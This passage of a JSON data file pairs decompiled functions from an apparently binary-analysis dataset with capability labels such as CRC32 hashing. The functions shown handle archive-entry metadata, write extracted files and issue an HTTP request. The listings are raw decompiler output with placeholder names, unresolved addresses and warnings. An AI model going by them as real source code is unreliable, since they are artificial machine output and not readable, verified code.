        var_240h[0x42] = var_240h[0x42] | 4;\n        }\n        var_240h[0x49] = var_294h;\n        var_240h[0x4a] = var_290h;\n        var_226h._0_2_ = var_29ch >> 0x10;\n        var_22dh._1_2_ = (var_226h >> 9) + 0x7bc;\n        *0x8 = var_226h >> 5 & 0xf;\n        var_226h._0_2_ = var_226h & 0x1f;\n        var_226h._2_2_ = var_29ch >> 0xb;\n        var_222h = var_29ch >> 5 & 0x3f;\n        var_220h = (var_29ch & 0x1f) * 2;\n        puVar18 = &var_248h;\n        var_21eh = 0;\n        (**0x4574c4)(&var_22dh + 1);\n        var_258h = var_248h;\n        puVar12 = &var_258h;\n        var_254h = var_244h;\n        (**0x457530)(puVar12, &var_250h);\n        iVar8 = 0;\n        var_240h[0x43] = var_250h;\n        var_240h[0x44] = var_24ch;\n        var_240h[0x45] = var_250h;\n        var_240h[0x46] = var_24ch;\n        var_240h[0x47] = var_250h;\n        var_240h[0x48] = var_24ch;\n        if (4 < var_238h) {\n            var_234h = var_234h & 0xff000000;\n            do {\n                var_234h._0_2_ = CONCAT11(*(iVar8 + 1 + iVar14), *(iVar8 + iVar14));\n                var_234h = var_234h & 0xffff0000 | var_234h;\n                puVar15 = 0x44ea20;\n                puVar10 = &var_234h;\n                do {\n                    uVar16 = *puVar10;\n                    bVar19 = uVar16 < *puVar15;\n                    if (uVar16 != *puVar15) {\ncode_r0x0040db20:\n                        iVar11 = (1 - bVar19) - (bVar19 != 0);\n                        goto code_r0x0040db25;\n                    }\n                    if (uVar16 == 0) break;\n                    uVar16 = *(puVar10 + 1);\n                    bVar19 = uVar16 < puVar15[1];\n                    if (uVar16 != puVar15[1]) goto code_r0x0040db20;\n                    puVar10 = puVar10 + 2;\n                    puVar15 = puVar15 + 2;\n                } while (uVar16 != 0);\n                iVar11 = 0;\ncode_r0x0040db25:\n                if (iVar11 == 0) {\n                    uVar16 = *(iVar8 + 4 + iVar14);\n                    var_22dh._0_1_ = uVar16 >> 1 & 1;\n                    var_22eh = uVar16 >> 2 & 1;\n                    iVar11 = iVar8 + 5;\n                    if ((uVar16 & 1) != 0) {\n                        Var6 = CONCAT21(CONCAT11(*(iVar8 + 8 + iVar14), *(iVar8 + 7 + iVar14)), *(iVar8 + 6 + iVar14));\n                        uVar9 = CONCAT31(Var6, *(iVar11 + iVar14));\n                        iVar11 = iVar8 + 9;\n                        uVar20 = fcn.0043bd90(uVar9 + 0xb6109100, (Var6 >> 0x17) + 2 + (0x49ef6eff < uVar9), 10000000, 0\n                                             );\n                        var_240h[0x47] = uVar20;\n                        var_240h[0x48] = uVar20 >> 0x20;\n                    }\n                    if (var_22dh != 0) {\n                        iVar8 = iVar11 + 3;\n                        iVar2 = iVar11 + 2;\n                        iVar3 = iVar11 + 1;\n                        puVar1 = iVar11 + iVar14;\n                        iVar11 = iVar11 + 4;\n                        puVar12 = CONCAT31(CONCAT21(CONCAT11(*(iVar8 + iVar14), *(iVar2 + iVar14)), *(iVar3 + iVar14)), \n                                           *puVar1) + -0x49ef6f00;\n                        uVar20 = fcn.0043bd90();\n                        var_240h[0x43] = uVar20;\n                        var_240h[0x44] = uVar20 >> 0x20;\n                    }\n                    if (var_22eh != 0) {\n                        puVar12 = CONCAT31(CONCAT21(CONCAT11(*(iVar11 + 3 + iVar14), *(iVar11 + 2 + iVar14)), \n                                                    *(iVar11 + 1 + iVar14)), *(iVar11 + iVar14)) + -0x49ef6f00;\n                        uVar20 = fcn.0043bd90();\n                        var_240h[0x45] = uVar20;\n                        var_240h[0x46] = uVar20 >> 0x20;\n                    }\n                    break;\n                }\n                iVar8 = iVar8 + 4 + *(iVar8 + 2 + iVar14);\n            } while (iVar8 + 4U < var_238h);\n        }\n        if (iVar14 != 0) {\n            fcn.0042e173(iVar14, puVar12);\n        }\n        piVar17 = var_23ch + 2;\n        for (iVar14 = 0x4b; iVar14 != 0; iVar14 = iVar14 + -1) {\n            *piVar17 = *var_240h;\n            var_240h = var_240h + 1;\n            piVar17 = piVar17 + 1;\n        }\n        var_23ch[0x4d] = arg_8h;\n        fcn.0042d636(puVar18);\n        return;\n    }\n    fcn.0042e173(iVar14);\ncode_r0x0040d822:\n    fcn.0042d636(in_stack_fffffd4c);\n    return;\n}\n",
        "token_count": 3685
    },
    "0040dda0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_354h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040dda0(int32_t arg_8h, char *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t *in_ECX;\n    char *pcVar7;\n    uint unaff_EBX;\n    char *pcVar8;\n    int32_t *var_354h;\n    char *var_350h;\n    uint var_349h;\n    uint32_t var_240h;\n    uint var_23ch;\n    uint var_234h;\n    uint var_22ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_350h = arg_ch;\n    var_354h = in_ECX;\n    if (arg_14h == 3) {\n        if (arg_8h != in_ECX[1]) {\n            if (in_ECX[1] != -1) {\n                fcn.0040d4a0();\n            }\n            in_ECX[1] = -1;\n            if (*(*in_ECX + 4) <= arg_8h) goto code_r0x0040dde1;\n            if (arg_8h < *(*in_ECX + 0x10)) {\n                fcn.0040cc80();\n            }\n            iVar6 = *(*in_ECX + 0x10);\n            while (iVar6 < arg_8h) {\n                iVar6 = *in_ECX;\n                if (((iVar6 != 0) && (*(iVar6 + 0x18) != 0)) && (iVar4 = *(iVar6 + 0x10) + 1,  iVar4 != *(iVar6 + 4))) {\n                    *(iVar6 + 0x10) = iVar4;\n                    *(iVar6 + 0x14) = *(iVar6 + 0x14) + *(iVar6 + 0x50) + *(iVar6 + 0x4c) + 0x2e + *(iVar6 + 0x48);\n                    iVar4 = fcn.0040c880(iVar6 + 0x28, iVar6 + 0x78, 0, 0);\n                    *(iVar6 + 0x18) = iVar4 == 0;\n                }\n                iVar6 = *(*in_ECX + 0x10);\n            }\n            fcn.0040d0d0(in_ECX[0x4e]);\n            var_354h[1] = arg_8h;\n        }\n        piVar3 = var_354h;\n        iVar6 = fcn.0040d240(var_350h, &var_349h);\n        if (iVar6 < 1) {\n            fcn.0040d4a0();\n            piVar3[1] = -1;\n        }\n        if (var_349h == '\\0') {\n            if (iVar6 < 1) {\n                fcn.0042d636(var_354h);\n                return;\n            }\n            fcn.0042d636(var_354h);\n            return;\n        }\ncode_r0x0040dede:\n        fcn.0042d636(unaff_EBX);\n        return;\n    }\n    if ((arg_14h != 2) && (arg_14h != 1)) {\ncode_r0x0040dde1:\n        fcn.0042d636(var_354h);\n        return;\n    }\n    if (in_ECX[1] != -1) {\n        fcn.0040d4a0();\n    }\n    in_ECX[1] = -1;\n    if (*(*in_ECX + 4) <= arg_8h) goto code_r0x0040dde1;\n    if (arg_8h < *(*in_ECX + 0x10)) {\n        fcn.0040cc80();\n    }\n    iVar6 = *(*in_ECX + 0x10);\n    while (iVar6 < arg_8h) {\n        iVar6 = *in_ECX;\n        if (((iVar6 != 0) && (*(iVar6 + 0x18) != 0)) && (iVar4 = *(iVar6 + 0x10) + 1,  iVar4 != *(iVar6 + 4))) {\n            *(iVar6 + 0x14) = *(iVar6 + 0x14) + *(iVar6 + 0x50) + *(iVar6 + 0x4c) + 0x2e + *(iVar6 + 0x48);\n            *(iVar6 + 0x10) = iVar4;\n            iVar4 = fcn.0040c880(iVar6 + 0x28, iVar6 + 0x78, 0, 0);\n            *(iVar6 + 0x18) = iVar4 == 0;\n        }\n        iVar6 = *(*in_ECX + 0x10);\n    }\n    fcn.0040d620(arg_8h);\n    pcVar5 = var_350h;\n    if ((var_240h >> 4 & 1) != 0) goto code_r0x0040dede;\n    var_218h._0_1_ = 0;\n    if (arg_14h == 1) goto code_r0x0040e081;\n    cVar2 = *var_350h;\n    pcVar7 = var_350h;\n    pcVar8 = var_350h;\n    while (cVar2 != '\\0') {\n        if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n            pcVar8 = pcVar7 + 1;\n        }\n        pcVar1 = pcVar7 + 1;\n        pcVar7 = pcVar7 + 1;\n        cVar2 = *pcVar1;\n    }\n    fcn.0042dfd8(&var_110h, var_350h, 0x104);\n    if (pcVar8 == pcVar5) {\n        var_110h._0_1_ = '\\0';\ncode_r0x0040e03a:\n        (**0x457374)(&var_218h, 0x44ea2c, in_ECX + 0x50, &var_110h, pcVar8);\n    }\n    else {\n        pcVar8[&var_110h - pcVar5] = '\\0';\n        if (((var_110h != '/') && (var_110h != '\\\\')) && ((var_110h == '\\0' || (var_110h._1_1_ != ':'))))\n        goto code_r0x0040e03a;\n        (**0x457374)(&var_218h, 0x44ea24, &var_110h, pcVar8);\n    }\n    pcVar5 = (**0x4573b4)(&var_218h, 0x40000000, 0, 0, 2, var_240h, 0);\ncode_r0x0040e081:\n    if (pcVar5 == 0xffffffff) {\n        fcn.0042d636(unaff_EBX);\n        return;\n    }\n    fcn.0040d0d0(in_ECX[0x4e]);\n    if (var_354h[0x4f] == 0) {\n        iVar6 = fcn.0042cbeb(0x4000);\n        var_354h[0x4f] = iVar6;\n    }\n    var_350h = NULL;\n    do {\n        iVar6 = fcn.0040d240(var_354h[0x4f], &var_349h);\n        if (iVar6 == -0x6a) {\n            var_350h = 0x1000;\n            goto code_r0x0040e191;\n        }\n        if (iVar6 < 0) break;\n        if ((0 < iVar6) && (iVar4 = (**0x457420)(pcVar5, var_354h[0x4f], iVar6, &var_354h, 0),  iVar4 == 0)) {\n            var_350h = 0x400;\n            goto code_r0x0040e191;\n        }\n        if (var_349h != '\\0') goto code_r0x0040e191;\n    } while (iVar6 != 0);\n    var_350h = 0x5000000;\ncode_r0x0040e191:\n    fcn.0040d4a0();\n    if (var_350h == NULL) {\n        (**0x45755c)(pcVar5, &var_234h, &var_23ch, &var_22ch);\n    }\n    if (arg_14h != 1) {\n        (**0x4573b8)(pcVar5);\n    }\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 2036
    },
    "0040e360": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e360(int32_t arg_8h, char *arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint unaff_EBX;\n    char *pcVar9;\n    int32_t *var_354h;\n    char *var_350h;\n    char var_349h;\n    uint var_348h;\n    uint32_t var_240h;\n    uint var_23ch;\n    uint var_234h;\n    uint var_22ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_350h = arg_ch;\n    if (*0x4572dc == NULL) {\ncode_r0x0040e3bc:\n        pcVar4 = 0x10000;\n        goto code_r0x0040e607;\n    }\n    if (**0x4572dc != 1) {\n        pcVar4 = 0x80000;\n        goto code_r0x0040e607;\n    }\n    piVar3 = (*0x4572dc)[1];\n    var_354h = piVar3;\n    if (piVar3[1] != -1) {\n        fcn.0040d4a0();\n    }\n    piVar3[1] = -1;\n    if (*(*piVar3 + 4) <= arg_8h) goto code_r0x0040e3bc;\n    if (arg_8h < *(*piVar3 + 0x10)) {\n        fcn.0040cc80();\n    }\n    iVar6 = *(*piVar3 + 0x10);\n    while (iVar6 < arg_8h) {\n        iVar6 = *piVar3;\n        if (((iVar6 != 0) && (*(iVar6 + 0x18) != 0)) && (iVar5 = *(iVar6 + 0x10) + 1,  iVar5 != *(iVar6 + 4))) {\n            *(iVar6 + 0x10) = iVar5;\n            *(iVar6 + 0x14) = *(iVar6 + 0x14) + *(iVar6 + 0x50) + *(iVar6 + 0x4c) + 0x2e + *(iVar6 + 0x48);\n            iVar5 = fcn.0040c880(iVar6 + 0x28, iVar6 + 0x78, 0, 0);\n            *(iVar6 + 0x18) = iVar5 == 0;\n        }\n        iVar6 = *(*piVar3 + 0x10);\n    }\n    fcn.0040d620(arg_8h);\n    pcVar4 = var_350h;\n    if ((var_240h >> 4 & 1) != 0) {\n        pcVar4 = NULL;\n        goto code_r0x0040e607;\n    }\n    cVar2 = *var_350h;\n    var_218h._0_1_ = 0;\n    pcVar8 = var_350h;\n    pcVar9 = var_350h;\n    while (cVar2 != '\\0') {\n        if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n            pcVar9 = pcVar8 + 1;\n        }\n        pcVar1 = pcVar8 + 1;\n        pcVar8 = pcVar8 + 1;\n        cVar2 = *pcVar1;\n    }\n    fcn.0042dfd8(&var_110h, var_350h, 0x104);\n    if (pcVar9 == pcVar4) {\n        var_110h._0_1_ = '\\0';\ncode_r0x0040e493:\n        (**0x457374)(&var_218h, 0x44ea2c, piVar3 + 0x50, &var_110h, pcVar9);\n    }\n    else {\n        pcVar9[&var_110h - pcVar4] = '\\0';\n        if (((var_110h != '/') && (var_110h != '\\\\')) && ((var_110h == '\\0' || (var_110h._1_1_ != ':'))))\n        goto code_r0x0040e493;\n        (**0x457374)(&var_218h, 0x44ea24, &var_110h, pcVar9);\n    }\n    iVar6 = (**0x4573b4)(&var_218h, 0x40000000, 0, 0, 2, var_240h, 0);\n    if (iVar6 == -1) {\n        pcVar4 = 0x200;\n    }\n    else {\n        fcn.0040d0d0(piVar3[0x4e]);\n        piVar3 = var_354h;\n        if (var_354h[0x4f] == 0) {\n            iVar5 = fcn.0042cbeb(0x4000);\n            piVar3[0x4f] = iVar5;\n        }\n        var_350h = NULL;\n        do {\n            iVar5 = fcn.0040d240(piVar3[0x4f], &var_349h);\n            if (iVar5 == -0x6a) {\n                var_350h = 0x1000;\n                goto code_r0x0040e5d1;\n            }\n            if (iVar5 < 0) break;\n            if ((0 < iVar5) && (iVar7 = (**0x457420)(iVar6, piVar3[0x4f], iVar5, &var_354h, 0),  iVar7 == 0)) {\n                var_350h = 0x400;\n                goto code_r0x0040e5d1;\n            }\n            if (var_349h != '\\0') goto code_r0x0040e5d1;\n        } while (iVar5 != 0);\n        var_350h = 0x5000000;\ncode_r0x0040e5d1:\n        fcn.0040d4a0();\n        pcVar4 = var_350h;\n        if (var_350h == NULL) {\n            (**0x45755c)(iVar6, &var_234h, &var_23ch, &var_22ch);\n        }\n        (**0x4573b8)(iVar6);\n    }\ncode_r0x0040e607:\n    *0x4576b0 = pcVar4;\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 1529
    },
    "004113d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004113d0(uchar *arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint32_t arg_20h, \n            uint noname_7, int32_t arg_28h, uint *arg_2ch, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint32_t arg_40h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t *in_FS_OFFSET;\n    uint uVar8;\n    uint uVar9;\n    uint var_a2ch;\n    uint var_a28h;\n    uint var_a24h;\n    int32_t var_a20h;\n    int32_t var_a1ch;\n    uint32_t var_a18h;\n    uint32_t var_a14h;\n    uint var_a04h;\n    uint32_t var_a00h;\n    uint32_t var_9f8h;\n    uint var_9e8h;\n    uint32_t var_9e4h;\n    uint *var_9dch;\n    uint var_9cch;\n    uint32_t var_9c8h;\n    uint32_t var_9c0h;\n    uint var_9b0h;\n    uint32_t var_9ach;\n    uint *var_9a4h;\n    uint var_994h;\n    uint32_t var_990h;\n    uint32_t var_988h;\n    uint var_978h;\n    uint32_t var_974h;\n    uint *var_96ch;\n    int32_t var_95ch;\n    uint32_t var_958h;\n    uint *var_950h;\n    uint var_940h;\n    uint32_t var_93ch;\n    uint32_t var_934h;\n    uint var_924h;\n    uint32_t var_920h;\n    uint *var_918h;\n    uint32_t var_908h;\n    uint32_t var_904h;\n    uint *var_8fch;\n    uint var_8ech;\n    uint32_t var_8e8h;\n    uint var_8e0h;\n    uint var_110h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441fcb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_a18h = 0;\n    var_4h = 1;\n    uVar9 = 0;\n    uVar8 = 0x44c726;\n    var_9ach = 0xf;\n    var_9b0h = 0;\n    var_9c0h = var_9c0h & 0xffffff00;\n    var_10h = uVar1;\n    fcn.004090e0(0x44c726, 0);\n    var_93ch = 0xf;\n    var_940h = 0;\n    var_950h = var_950h & 0xffffff00;\n    var_958h = 0xf;\n    var_95ch = 0;\n    var_96ch = var_96ch & 0xffffff00;\n    var_904h = 0xf;\n    var_908h = 0;\n    var_918h = var_918h & 0xffffff00;\n    var_9c8h = 0xf;\n    var_9cch = 0;\n    var_9dch = var_9dch & 0xffffff00;\n    var_990h = 0xf;\n    var_994h = 0;\n    var_9a4h = var_9a4h & 0xffffff00;\n    var_9e4h = 0xf;\n    var_9e8h = 0;\n    var_9f8h = var_9f8h & 0xffffff00;\n    var_4h._0_1_ = 8;\n    var_a1ch = 0;\n    fcn.00411320(&var_934h);\n    var_4h._0_1_ = 9;\n    fcn.00408ff0(uVar8, uVar9, uVar1);\n    var_4h = CONCAT31(var_4h._1_3_, 8);\n    if (0xf < var_920h) {\n        fcn.0042d62b(var_934h);\n    }\n    uVar1 = var_908h;\n    uVar7 = 8;\n    if (var_908h < 8) {\n        uVar7 = var_908h;\n    }\n    iVar2 = fcn.0040e640();\n    if (((iVar2 == 0) && (7 < uVar7)) && (uVar7 == 8)) {\n        var_a1ch = 8;\n    }\n    else {\n        uVar7 = 7;\n        if (uVar1 < 7) {\n            uVar7 = uVar1;\n        }\n        iVar2 = fcn.0040e640();\n        if (((iVar2 == 0) && (6 < uVar7)) && (uVar7 == 7)) {\n            var_a1ch = 7;\n        }\n    }\n    var_a24h._0_1_ = 0x2f;\n    var_a20h = fcn.004149c0(&var_918h, &var_a24h, 1);\n    if (var_a20h == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004090e0(0x44c726, 0);\n        var_4h = CONCAT31(var_4h._1_3_, 10);\n        uVar1 = 1;\n    }\n    else {\n        fcn.00414960(0xffffffff);\n        var_4h = 0xb;\n        uVar1 = 2;\n    }\n    var_a18h = uVar1;\n    fcn.00408ff0();\n    if ((uVar1 & 2) != 0) {\n        uVar1 = uVar1 & 0xfffffffd;\n        var_a18h = uVar1;\n        if (0xf < var_974h) {\n            fcn.0042d62b(var_988h);\n        }\n        var_974h = 0xf;\n        var_978h = 0;\n        var_988h = var_988h & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar1 & 1) != 0) && (uVar1 = uVar1 & 0xfffffffe,  var_a18h = uVar1,  0xf < var_8e8h)) {\n        fcn.0042d62b(var_8fch);\n    }\n    if (var_a20h == -1) {\n        puVar3 = var_918h;\n        if (var_904h < 0x10) {\n            puVar3 = &var_918h;\n        }\n        iVar2 = puVar3 + var_908h;\n    }\n    else {\n        puVar3 = var_918h;\n        if (var_904h < 0x10) {\n            puVar3 = &var_918h;\n        }\n        iVar2 = puVar3 + var_a20h;\n    }\n    puVar3 = var_918h;\n    if (var_904h < 0x10) {\n        puVar3 = &var_918h;\n    }\n    var_8e8h = 0xf;\n    var_8ech = 0;\n    var_8fch = var_8fch & 0xffffff00;\n    fcn.00414de0(&var_8fch, puVar3 + var_a1ch, iVar2, var_a2ch);\n    var_4h._0_1_ = 0xc;\n    fcn.00408ff0();\n    var_4h._0_1_ = 8;\n    if (0xf < var_8e8h) {\n        fcn.0042d62b(var_8fch);\n    }\n    iVar2 = fcn.004149c0(&var_950h, 0x44ecf8, 1);\n    if (iVar2 == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004092e0(&var_950h, 0, 0xffffffff);\n        var_4h = 0xe;\n        uVar1 = uVar1 | 8;\n    }\n    else {\n        fcn.00414960(iVar2);\n        var_4h = CONCAT31(var_4h._1_3_, 0xd);\n        uVar1 = uVar1 | 4;\n    }\n    var_a18h = uVar1;\n    fcn.00408ff0();\n    if ((uVar1 & 8) != 0) {\n        uVar1 = uVar1 & 0xfffffff7;\n        var_a18h = uVar1;\n        if (0xf < var_8e8h) {\n            fcn.0042d62b(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar1 & 4) != 0) && (uVar1 = uVar1 & 0xfffffffb,  var_a18h = uVar1,  0xf < var_920h)) {\n        fcn.0042d62b(var_934h);\n    }\n    var_a20h = fcn.004149c0(&var_96ch, 0x44ebe0, 1);\n    if (var_a20h == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004090e0(0x44c726, 0);\n        var_4h = 0x10;\n        uVar1 = uVar1 | 0x20;\n    }\n    else {\n        fcn.00414960(0xffffffff);\n        var_4h = CONCAT31(var_4h._1_3_, 0xf);\n        uVar1 = uVar1 | 0x10;\n    }\n    var_a18h = uVar1;\n    fcn.00408ff0();\n    if ((uVar1 & 0x20) != 0) {\n        uVar1 = uVar1 & 0xffffffdf;\n        var_a18h = uVar1;\n        if (0xf < var_8e8h) {\n            fcn.0042d62b(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar1 & 0x10) != 0) && (uVar1 = uVar1 & 0xffffffef,  var_a18h = uVar1,  0xf < var_920h)) {\n        fcn.0042d62b(var_934h);\n    }\n    iVar2 = var_a20h;\n    if (var_a20h == -1) {\n        iVar2 = var_95ch;\n    }\n    fcn.00414960(iVar2);\n    var_4h._0_1_ = 0x11;\n    fcn.00408ff0();\n    var_4h._0_1_ = 8;\n    if (0xf < var_920h) {\n        fcn.0042d62b(var_934h);\n    }\n    if (var_a1ch < 1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004090e0(0x44c726, 0);\n        var_4h = 0x13;\n        uVar1 = uVar1 | 0x80;\n    }\n    else {\n        fcn.00414960(var_a1ch + -3);\n        var_4h = CONCAT31(var_4h._1_3_, 0x12);\n        uVar1 = uVar1 | 0x40;\n    }\n    var_a18h = uVar1;\n    fcn.00408ff0();\n    if (uVar1 < '\\0') {\n        uVar1 = uVar1 & 0xffffff7f;\n        var_a18h = uVar1;\n        if (0xf < var_8e8h) {\n            fcn.0042d62b(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar1 & 0x40) != 0) && (uVar1 = uVar1 & 0xffffffbf,  var_a18h = uVar1,  0xf < var_920h)) {\n        fcn.0042d62b(var_934h);\n    }\n    var_a20h = fcn.004149c0(&var_950h, 0x44ecfc, 1);\n    if (var_a20h == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004090e0(0x44c726, 0);\n        var_4h = 0x15;\n        uVar1 = uVar1 | 0x200;\n    }\n    else {\n        fcn.00414960(0xffffffff);\n        var_4h = CONCAT31(var_4h._1_3_, 0x14);\n        uVar1 = uVar1 | 0x100;\n    }\n    var_a18h = uVar1;\n    fcn.00408ff0();\n    if ((uVar1 & 0x200) != 0) {\n        uVar1 = uVar1 & 0xfffffdff;\n        var_a18h = uVar1;\n        if (0xf < var_8e8h) {\n            fcn.0042d62b(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar1 & 0x100) != 0) && (uVar1 = uVar1 & 0xfffffeff,  var_a18h = uVar1,  0xf < var_920h)) {\n        fcn.0042d62b(var_934h);\n    }\n    if (var_a20h == -1) {\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n        fcn.004092e0(&var_950h, 0, 0xffffffff);\n        var_4h = 0x17;\n        uVar1 = uVar1 | 0x800;\n    }\n    else {\n        fcn.00414960(var_a20h);\n        var_4h = CONCAT31(var_4h._1_3_, 0x16);\n        uVar1 = uVar1 | 0x400;\n    }\n    var_a18h = uVar1;\n    fcn.00408ff0();\n    if ((uVar1 & 0x800) != 0) {\n        uVar1 = uVar1 & 0xfffff7ff;\n        if (0xf < var_8e8h) {\n            fcn.0042d62b(var_8fch);\n        }\n        var_8e8h = 0xf;\n        var_8ech = 0;\n        var_8fch = var_8fch & 0xffffff00;\n    }\n    var_4h = 8;\n    if ((uVar1 & 0x400) != 0) {\n        if (0xf < var_974h) {\n            fcn.0042d62b(var_988h);\n        }\n        var_974h = 0xf;\n        var_978h = 0;\n        var_988h = var_988h & 0xffffff00;\n    }\n    puVar3 = var_96ch;\n    if (var_958h < 0x10) {\n        puVar3 = &var_96ch;\n    }\n    (**0x45743c)(puVar3);\n    puVar3 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar3 = &arg_ch;\n    }\n    (**0x45743c)(puVar3);\n    if (arg_28h == 0) {\n        puVar3 = arg_2ch;\n        if (arg_40h < 0x10) {\n            puVar3 = &arg_2ch;\n        }\n        uVar8 = 0;\n        var_a1ch = (**0x45745c)(puVar3, 0, 0, 0, 0);\n    }\n    else {\n        puVar3 = fcn.004233e0();\n        var_4h._0_1_ = 0x18;\n        if (0xf < puVar3[5]) {\n            puVar3 = *puVar3;\n        }\n        uVar8 = 0;\n        var_a1ch = (**0x45745c)(puVar3, 0, 0, 0, 0);\n        var_4h = CONCAT31(var_4h._1_3_, 8);\n        if (0xf < var_974h) {\n            fcn.0042d62b(var_988h);\n        }\n        var_974h = 0xf;\n        var_978h = 0;\n        var_988h = var_988h & 0xffffff00;\n    }\n    puVar3 = var_9a4h;\n    if (var_990h < 0x10) {\n        puVar3 = &var_9a4h;\n    }\n    uVar9 = fcn.0042e323(puVar3);\n    puVar3 = var_9dch;\n    if (var_9c8h < 0x10) {\n        puVar3 = &var_9dch;\n    }\n    iVar2 = (**0x457550)(puVar3, \"https\");\n    iVar2 = (-(iVar2 != 0) & 0xff800000) + 0x4800000;\n    if (var_a1ch != 0) {\n        puVar3 = var_96ch;\n        if (var_958h < 0x10) {\n            puVar3 = &var_96ch;\n        }\n        iVar4 = (**0x457578)(var_a1ch, puVar3, uVar9, 0, 0, 3, iVar2, 0);\n        if (iVar4 != 0) {\n            puVar3 = var_950h;\n            if (var_93ch < 0x10) {\n                puVar3 = &var_950h;\n            }\n            iVar2 = (**0x4575bc)(iVar4, 0x44ed08, puVar3, 0, 0, 0, iVar2, 0);\n            if (iVar2 != 0) {\n                uVar9 = fcn.0040e6f0();\n                var_4h._0_1_ = 0x19;\n                fcn.00409750(uVar9);\n                var_4h = CONCAT31(var_4h._1_3_, 0x1b);\n                if (0xf < var_a00h) {\n                    fcn.0042d62b(var_a14h);\n                }\n                var_a00h = 0xf;\n                var_a04h = 0;\n                var_a14h = var_a14h & 0xffffff00;\n                puVar3 = var_8fch;\n                if (var_8e8h < 0x10) {\n                    puVar3 = &var_8fch;\n                }\n                (**0x45738c)(iVar2, puVar3, var_8ech, 0x20000000);\n                iVar5 = (**0x45753c)(iVar2, 0, 0, 0, 0);\n                var_a18h = 0x100;\n                iVar6 = (**0x4575d4)(iVar2, 0x13, &var_110h, &var_a18h, 0);\n                if ((iVar6 == 0) || (iVar6 = fcn.0042e323(&var_110h),  iVar6 != 200)) {\n                    fcn.00408f20(\"ERROR\");\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    fcn.00408f80();\n                    goto code_r0x004121fc;\n                }\n                if (iVar5 != 0) {\n                    iVar5 = (**0x457480)(iVar2, &var_8e0h, 1999, &var_a20h);\n                    while ((iVar5 != 0 && (var_a20h != 0))) {\n                        *(&var_8e0h + var_a20h) = 0;\n                        fcn.00414be0(&var_934h, &var_9c0h, &var_8e0h);\n                        var_4h._0_1_ = 0x1c;\n                        fcn.00408ff0();\n                        var_4h = CONCAT31(var_4h._1_3_, 0x1b);\n                        if (0xf < var_920h) {\n                            fcn.0042d62b(var_934h);\n                        }\n                        var_920h = 0xf;\n                        var_924h = 0;\n                        var_934h = var_934h & 0xffffff00;\n                        iVar5 = (**0x457480)(iVar2, &var_8e0h, 1999, &var_a20h);\n                    }\n                }\n                (**0x457458)(iVar2);\n                var_4h = CONCAT31(var_4h._1_3_, 8);\n                fcn.00408f80();\n            }\n            (**0x457458)(iVar4);\n        }\n        (**0x457458)(var_a1ch);\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.00408ff0();\n    if (0xf < var_9e4h) {\n        fcn.0042d62b(var_9f8h);\n    }\n    var_9e4h = 0xf;\n    var_9e8h = 